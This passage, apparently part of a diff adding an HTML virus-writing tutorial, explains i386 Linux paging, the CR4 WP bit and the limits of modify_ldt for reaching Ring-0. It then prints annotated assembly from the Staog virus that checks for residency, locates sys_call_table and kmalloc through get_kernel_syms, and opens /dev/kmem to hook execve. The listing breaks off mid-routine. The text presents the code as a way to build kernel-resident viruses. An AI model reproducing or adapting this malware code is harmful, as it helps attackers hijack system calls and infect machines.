+&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">*</span>temp<span style="color: #339933;">!=</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>z<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>z<span style="color: #339933;">&lt;</span><span style="color: #0000dd;">4000000</span><span style="color: #339933;">;</span>z<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><span style="color: black;">&#125;</span><span style="color: #339933;">;</span> &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* slow-down */</span><br/>
+&nbsp; <br/>
+&nbsp; temp<span style="color: #339933;">++;</span><br/>
+&nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; <span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
+&nbsp; <span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
+&nbsp; tpaginas<span style="color: #339933;">++;</span><br/>
+&nbsp; <br/>
+&nbsp; <span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
+<br/>
+<span style="color: black;">&#125;</span><br/>
+<br/>
+<span style="color: #993333;">void</span> cleanup_module<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+<br/>
+<span style="color: #339933;">#endif</span><br/>
+<br/>
+<span style="color: #808080; font-style: italic;">/***************************************************************************/</span><br/>
+&nbsp;</div>
+<p>After the execution of this program we can get the mapped pages in that moment, and the protection attributes of each page.</p>
+<p>The first page we would see would be the read-only pages of the process being executed in Ring-3 on the address 8040000 with read only attributes and the user bit, the next ones would be the read/write pages of the executable, with user attributes too. After, in the 40000000 address we would have the library libc mapped in memory in a similar way: first r/w code, and after, some read only pages. When we arrive to the linear address 0xC0000000 we enter the marvelous world of the core, where is mapped all the physical memory of your PC. If it's Pentium or higher, it will use 4M pages. So, if you have 16 megs of RAM, from the 0xC0000000 address, Linux would use 4 entries in the directory table for map those 16 megs, if it would have 32 it would use 8, etc.</p>
+<p>This system guides us to make ourselves some questions, like, for example, what would happen if we got 1G of physical memory? In these pages lies the code of the core, aswell as the page table, and surprisingly it lacks of protection via pagination, uses r/w attributes and the user bit for mark the page, so the bad-coded modules that try to overwrite the code of the core would achieve such goal without making any protection fault :)</p>
+<p>But that's not all, after map all the physical memory of the machine. It maps some 4Kb pages, all with system attributes, all except one, used for store the IDT (interrupt table) that is the only one with read-only attributes and the S bit, so any bad-coded module that could try to overwrite it, wouldn't achieve that, and would die by a protection fault, and the system would remain stable.</p>
+<p>The fact that any Ring-0 process is not able to modify a read-only page is handled by the WP bit of the control register CR4. If that bit is set to 1, then all the Ring-0 processes won't be able to write in read only pages, neither user, neither kernel. If that bit is set to 0, the memory protection works like a 386 and a Ring-0 process can do whatever it wants to, being able to modify all mapped pages, no matter of their protection attributes. So, if a Linux module wants to modify the IDT, will firstly have to deactivate the WP bit of the CR4 reg for be able to write, or modify the page attributes of that page in the page table.</p>
+<p>Because all the said, the real mechanism of protection in Linux is the segmentation, and not the pagination as it occurs in Windows NT. If we would have 4G segments, as in NT, and the pagination would be as ids, we would have free access to kernel memory, but this is not the case.</p>
+<p>NOTE: Actual versions as 2.2.XX of the core use a protection similar to NT with 4G segments, painfully i haven't been able to look at the page table of that version,but it's a fool thing to think it remains stable</p>
+<p>Another possibility of achieve Ring-0 in Linux consist is the call to the system call modify_ldt for generate a CALL GATE. That system call was created for make WINE to be able to emulate windows' memory system, where the user segment descriptors lies at the LDT and not in the GDT, and where it's possible to directionate all the memory with those segments. Generate a CALL GATE with modify_ldt could be possible if we were able to write to every fields of each generated entry, but that's not possible. Firstly, modify_ldt doesn't accepts as an entry an INTEL segment descriptor, it uses this pseudo structure that will be later translated to a descriptor with INTEL format inside the call:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;<span style="color: #993333;">struct</span> modify_ldt_ldt_s <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> &nbsp;entry_number<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* The entry we wanna modify &nbsp; &nbsp; &nbsp; &nbsp; */</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> base_addr<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* The base address of the segment &nbsp; */</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> &nbsp;limit<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* The limit of the segment &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> &nbsp;seg_32bit<span style="color: #339933;">:</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* If its of 16 or 32 bits &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> &nbsp;contents<span style="color: #339933;">:</span><span style="color: #0000dd;">2</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* If its of data, code or stack &nbsp; &nbsp; */</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> &nbsp;read_exec_only<span style="color: #339933;">:</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span> &nbsp;<span style="color: #808080; font-style: italic;">/* Protection attributes &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> &nbsp;limit_in_pages<span style="color: #339933;">:</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span> &nbsp;<br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> &nbsp;seg_not_present<span style="color: #339933;">:</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span> <span style="color: #808080; font-style: italic;">/* If it's in memory or not &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span> &nbsp;<br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> &nbsp;useable<span style="color: #339933;">:</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
+&nbsp;</div>
+<p>If we see the code of the call in <tt>/usr/src/linux/arch/i386/kernel/ldt.c</tt>, this code shouws us the transformation of that structure to an INTEL descriptor:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span>lp &nbsp; &nbsp; <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>ldt_info.<span style="color: #202020;">base_addr</span> <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0x0000ffff</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&lt;&lt;</span> <span style="color: #0000dd;">16</span><span style="color: black;">&#41;</span> <span style="color: #339933;">|</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>ldt_info.<span style="color: #202020;">limit</span> <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0x0ffff</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span><span style="color: black;">&#40;</span>lp<span style="color: #339933;">+</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>ldt_info.<span style="color: #202020;">base_addr</span> <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0xff000000</span><span style="color: black;">&#41;</span> <span style="color: #339933;">|</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>ldt_info.<span style="color: #202020;">base_addr</span> <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0x00ff0000</span><span style="color: black;">&#41;</span><span style="color: #339933;">&gt;&gt;</span><span style="color: #0000dd;">16</span><span style="color: black;">&#41;</span> <span style="color: #339933;">|</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>ldt_info.<span style="color: #202020;">limit</span> <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0xf0000</span><span style="color: black;">&#41;</span> <span style="color: #339933;">|</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>ldt_info.<span style="color: #202020;">contents</span> <span style="color: #339933;">&lt;&lt;</span> <span style="color: #0000dd;">10</span><span style="color: black;">&#41;</span> <span style="color: #339933;">|</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>ldt_info.<span style="color: #202020;">read_exec_only</span> <span style="color: #339933;">^</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&lt;&lt;</span> <span style="color: #0000dd;">9</span><span style="color: black;">&#41;</span> <span style="color: #339933;">|</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>ldt_info.<span style="color: #202020;">seg_32bit</span> <span style="color: #339933;">&lt;&lt;</span> <span style="color: #0000dd;">22</span><span style="color: black;">&#41;</span> <span style="color: #339933;">|</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>ldt_info.<span style="color: #202020;">limit_in_pages</span> <span style="color: #339933;">&lt;&lt;</span> <span style="color: #0000dd;">23</span><span style="color: black;">&#41;</span> <span style="color: #339933;">|</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>ldt_info.<span style="color: #202020;">seg_not_present</span> <span style="color: #339933;">^</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&lt;&lt;</span> <span style="color: #0000dd;">15</span><span style="color: black;">&#41;</span> <span style="color: #339933;">|</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #208080;">0x7000</span><span style="color: #339933;">;</span> &nbsp;<br/>
+&nbsp;</div>
+<p>ldt_info is the structure we have passed as a parameter,and *lp is a pointer inside the LDT where resides the segment entry we want to modify. Seeing the structure of an INTEL entry we can see the transformation:</p>
+<pre>
+    63-54  55  54  53  52   51-48   47  46-45   44  43-40   39-16 15-0
+    
+    base   G   D   R   U    limit   P   DPL      S   type   base  limit
+    31-24                   19-16                           23-0  15-0
+</pre>
+<p>With the *lp we fill the 32 first bits of the entry, corresponding to the 16 first bits of the limit and the 16 first bits of the base address, and with *(lp+1) we fill the rest of the information. But after make all the operations with ldt_info, there is an OR operation with the 0x7000 constant. Passing this constant to binary we got 0111000000000000, so we know that always the generated descriptors will have the bits 44, 45 and 46 actives. Those bits correspond with the DPL and the S bit. So we could only create user segments. That doesn't matter, because the segment must be of user for allow its execution by an user, But the next bit, the S bit, has a lot of importance. The bit S is 1 when is a normal segment, and is 0 when a segment is of system like the TSS or the CALL GATES, so the generation of CALL GATES is impossible with the modify_ldt function. Modify_ldt also limits the creation of segments of limit over 0xC0000000, thing that would allow to directionate kernel's space. Modify_ldt checks the limit of the segment we want to create with the limits_OK function, and returns a boolean value as it can ve seen in this instruction. Last would be the last accessible byte by the segment, and first the first one, and the constant TASK_SIZE takes the value 0xC0000000.</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">&#40;</span>last <span style="color: #339933;">&gt;=</span> first <span style="color: #339933;">&amp;&amp;</span> last <span style="color: #339933;">&lt;</span> TASK_SIZE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp;</div>
+<p>If we can't write in the IDT, the GDT, the LDT, or the page table for jump to Ring-0, and the call modify_ldt is limited for the generation of CALL GATES, another possibility is to use virtual files for access kernel memory. This has a very important problem, and it's that files as /dev/mem and /dev/kmem are only accessed, by default, by the root. However, it's one of the choices more interesting for the creation of global residents under Linux. Staog is one of the few viruses for Linux that uses this method, also it doesn't wait the root to execute it, as it uses 3 different exploits for access /dev/kmem, but the exploit usages limits it's functionality to few kernel versions. The /dev/kmem allows the access of kernel memory, the first byte of that segment is the same of the first byte of kernel's segment or, what it's the same, the linear address 0xC0000000.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #0000ff; font-weight: bold;">.text</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # This is the <span style="color: #0000ff; font-weight: bold;">code</span> that hooks the<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # sys_call to execve<br/>
+<span style="color: #339933;">.</span>string <span style="color: #7f007f;">&quot;Staog by Quantum / VLAD&quot;</span> &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">global</span> main<br/>
+main<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">ebp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">11</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Firstly<span style="color: #339933;">,</span> checks if it<span style="color: #7f007f;">'s already <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $0x666,%ebx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# resident, calling to execve with<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; int $0x80 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # the value 0x666 in EBX, and if it<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; cmp $0x667,%ebx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # is in mem, the virii in mem will <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; jnz goresident1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # return the value 0x667<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; jmp tmpend<br/>
+goresident1:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $125,%eax<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $0x8000000,%ebx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $0x4000,%ecx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $7,%edx<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; int $0x80<br/>
+</span></div>
+<p>This code is very important, because we call to mprotect for unprotect the memory pages used by the virus. This is done for avoid the modification of the ELF file, and put the data of the virus in a data section and the code in one of code. In this way, we can put all the data of the virus in the same page, and it doesn't matter if the virus is in a code section, at the execution time, it unprotects it.</p>
+<p>NOTE: It is only possible to execute mprotect inside the PerProcess memory.</p>
+<p>The first it's going to try is to reserve some kernel memory for copy the virus code there, and after will modify the sys_call_table entry that corresponds to the execve for put instead it a pointer to the hooker routine of such function. For reserve memory inside the kernel, it's only possible with kernel internal calls like kmalloc. For be able to execute it, the virus overwrites the system call uname using /dev/kmem, and makes a call to uname with the int 0x80 when it before returning from the interrupt, and it would have already executed the code we used to reserve memory with kmalloc. But before all that, it needs to know uname address. For that, the virus uses the system call get_kernel_syms, with it, it can obtain a list with all the internal Linux functions, and also pointers to structures as the said sys_call_table, that is an array in memory with pointers to the accesible functions with int 0x80, like uname function.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">130</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Obtain the number of symbols<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# passing <span style="color: #00007f; font-weight: bold;">in</span> <span style="color: #46aa03; font-weight: bold;">EBX</span> the value <span style="color: #ff0000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">0x80</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Returns <span style="color: #00007f; font-weight: bold;">in</span> <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">:</span>Number of symbols<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; shll <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">6</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Make a <span style="color: #ff0000;">6</span> bit shifting to the left<span style="color: #339933;">.</span> This is <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # the same as multiply the symbol number by <span style="color: #ff0000;">64</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # that are the bytes occupied by each entry<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # returned by get_kernel_syms<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # The information obtained is the same that the<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # located <span style="color: #0000ff; font-weight: bold;">at</span> <span style="color: #339933;">/</span>proc<span style="color: #339933;">/</span>ksyms<span style="color: #339933;">.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # <span style="color: #ff0000;">4</span> bytes with a kernel address <span style="color: #00007f; font-weight: bold;">and</span> <span style="color: #ff0000;">60</span> bytes<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # with symbol<span style="color: #7f007f;">'s name<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; subl %eax,%esp &nbsp; &nbsp; &nbsp; &nbsp;# Reserve space in the stack<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl %esp,%esi &nbsp; &nbsp; &nbsp; &nbsp;# before the call &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # the ESI register will point to a mem structure<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pushl %eax<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl %esi,%ebx &nbsp; &nbsp; &nbsp; &nbsp;# obtain kernel symbols<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $130,%eax<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; int $0x80<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pushl %esi &nbsp; &nbsp; &nbsp;<br/>
+nextsym1: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Here i scan the symbol table in memory<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $thissym1,%edi &nbsp; # seaching the string current (zero-terminated)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; push %esi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; addl $4,%esi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; cmpb $95,(%esi)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; jnz notuscore<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; incl %esi<br/>
+notuscore:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; cmpsl<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; cmpsl<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pop %esi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; jz foundsym1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; addl $64,%esi &nbsp; &nbsp; &nbsp; &nbsp; # Look how it increments 64 by 64 for make the<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; jmp nextsym1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# comparisons<br/>
+foundsym1:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl (%esi),%esi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl %esi,current &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Store search result in the variable<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; popl %esi &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # current<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pushl %esi &nbsp; &nbsp; &nbsp;<br/>
+nextsym2: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Look also the kmalloc symbol with the<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $thissym2,%edi &nbsp; &nbsp; &nbsp; &nbsp; # same way.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; push %esi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; addl $4,%esi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; cmpsl<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; cmpsl<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pop %esi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; jz foundsym2<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; addl $64,%esi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; jmp nextsym2<br/>
+foundsym2:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl (%esi),%esi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl %esi,kmalloc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# Store search result in the kmalloc var<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; popl %esi<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; xorl %ecx,%ecx<br/>
+nextsym: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # find symbol<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl $thissym,%edi &nbsp; &nbsp; &nbsp; &nbsp; # And now sys_call_table address<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movb $15,%cl &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; push %esi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; addl $4,%esi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; rep <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; cmpsb<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pop %esi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; jz foundsym<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; addl $64,%esi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; jmp nextsym<br/>
+foundsym:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl (%esi),%esi<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; pop %eax<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; addl %eax,%esp<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl %esi,syscalltable &nbsp; &nbsp;# Store in the syscalltable variable the<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; xorl %edi,%edi &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# address found.<br/>
+</span></div>
+<p>At this point the virus knows the memory position of the sys_call_table</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">opendevkmem<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #0000ff; font-weight: bold;">$</span>devkmem<span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # Open the <span style="color: #339933;">/</span>dev<span style="color: #339933;">/</span>kmem file<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; movl <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">2</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # <span style="color: #46aa03; font-weight: bold;">EBX</span> = Ptr to string with the name<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> openfile &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# <span style="color: #46aa03; font-weight: bold;">ECX</span> = Open way <span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">2</span> read<span style="color: #339933;">/</span><span style="color: #0000ff; font-weight: bold;">write</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; orl <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,%</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">js</span> haxorroot &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # If it couldn<span style="color: #7f007f;">'t be opened, jumps to a<br/>
